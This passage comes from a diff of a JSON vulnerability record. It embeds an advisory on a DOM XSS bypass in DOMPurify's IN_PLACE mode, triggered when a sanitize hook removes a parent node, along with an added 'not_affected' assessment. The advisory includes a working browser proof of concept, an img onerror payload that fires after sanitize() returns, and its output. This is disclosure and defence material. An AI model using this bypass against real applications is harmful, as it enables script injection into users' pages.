`beforeSanitizeAttributes` and `afterSanitizeAttributes`.\n\n### PoC (browser)\n\nThe same thing in a real page, served from 127.0.0.1 and opened in Chromium:\n\n```html\n<!doctype html><meta charset=utf-8>\n<script src=\"purify.min.js\"></script>\n<body><pre id=log></pre>\n<script>\nwindow.fired = [];\nfunction run(mode) {\n  const D = DOMPurify(window);\n  D.addHook('afterSanitizeAttributes', n => {\n    if (n.getAttribute && n.getAttribute('class') === 'bad') {\n      if (mode === 'parent') n.parentNode.remove();\n      if (mode === 'self') n.remove();\n    }\n  });\n  const root = document.createElement('div');\n  document.body.appendChild(root);\n  root.innerHTML = '<figure><img class=bad src=data:,><img src=x onerror=\"fired.push(\\'' + mode + '\\')\"></figure><p>ok</p>';\n  D.sanitize(root, { IN_PLACE: true });\n  return root.outerHTML;\n}\nconst a = run('self'), b = run('parent');\nsetTimeout(() => {\n  document.getElementById('log').textContent =\n    'version=' + DOMPurify.version + '\\nself out=' + a + '\\nparent out=' + b + '\\nfired=' + JSON.stringify(fired);\n}, 1500);\n</script>\n```\n\nResult on 3.4.16:\n\n```\nversion=3.4.16\nself out=<div><figure><img src=\"x\"></figure><p>ok</p></div>\nparent out=<div><p>ok</p></div>\nfired=[\"parent\"]\n```\n\nThe returned tree is clean in both cases, but the handler on the detached image runs in the page for `parent`.\n\n### Impact\n\nAn app that uses `IN_PLACE` with a hook that removes a wrapper or a nearby element (for example \"drop the whole `<figure>` if its image is not allowed\") gets DOM XSS from attacker markup after `sanitize()` returns. It needs that kind of hook, so it falls under \"input plus an application choice\" in SECURITY.md, but it breaks the guarantee the README gives for hook detached nodes and is the same pattern as GHSA-55q2-fjhq-7xh7 and GHSA-p98j-92pf-mc4p.\n\n### Suggested fix\n\nInstead of only checking `currentNode`, check after each hook call whether anything outside the current node was detached. Two simple options:\n\n- before calling a hook in `IN_PLACE` mode, remember the next node the walker will visit and the current node's ancestors; after the hook, neutralize any of them that are no longer attached under `root`\n- or, after the walk, neutralize every element that was in the original tree but is no longer connected to `root` (for example by collecting the elements before the walk)",
+      "published": "2026-10-22T16:24:52Z",
+      "updated": "2026-10-22T16:24:53Z",
+      "analysis": {
+        "state": "not_affected",
+        "justification": "code_not_reachable",
+        "detail": "Not applicable as this is a transitive dependency only used for internally controlled markdown rendering."
       },
       "affects": [
         {
